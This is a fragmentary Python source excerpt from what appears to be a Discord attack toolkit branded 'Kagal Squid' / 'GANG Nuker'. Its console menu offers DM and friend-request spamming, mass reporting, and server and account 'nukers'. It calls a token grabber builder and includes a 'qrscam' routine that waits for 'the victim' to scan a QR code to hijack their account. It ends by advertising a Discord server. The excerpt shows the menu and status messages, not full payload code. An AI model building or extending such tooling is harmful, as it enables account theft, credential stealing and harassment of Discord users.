...
def spammer():
    ...
    colorama.init()
    print(f'{Fore.WHITE}> https://github.com/MichaelPranata/Kagal-Squid{Fore.RESET}') 
    print(f'{Fore.LIGHTMAGENTA_EX}────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────{Fore.RESET}')
    print(
        f'{Fore.LIGHTMAGENTA_EX}[1]{Fore.RESET} Spammer             {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[9]{Fore.RESET}  About/Activace           {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[17]{Fore.RESET} MassReport{Fore.RESET}')
    print(
        f'{Fore.LIGHTMAGENTA_EX}[2]{Fore.RESET} DM Spam             {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[10]{Fore.RESET} ServerJoiner Spammer     {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[18]{Fore.RESET} Server Nuker{Fore.RESET}')
    print(
        f'{Fore.LIGHTMAGENTA_EX}[3]{Fore.RESET} Friend Add Spammer  {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[11]{Fore.RESET} Leave                    {Fore.BLACK}|{Fore.RESET}{Fore.LIGHTMAGENTA_EX}[19]{Fore.RESET} Account Nuker{Fore.RESET}')
    print(
...
if __name__ == '__main__':
    grabber()
            ...
            print(f'{Fore.LIGHTYELLOW_EX}Make sure to share "GANG Nuker" with your friends <3')
            print(
                f'{Fore.LIGHTGREEN_EX}Successfully Created Token Grabber! | GANG Nuker')
        ...
        if coc == '2':
            ...
            def qrscam():
                ...
                print('Dont close GANG Nuker, wait for the victim scan the QR code')
...
- This "Kagal Squid Server / dev by Kagal Official#2144
- Main discord server is https://discord.gg/6FpDBWNSWZ
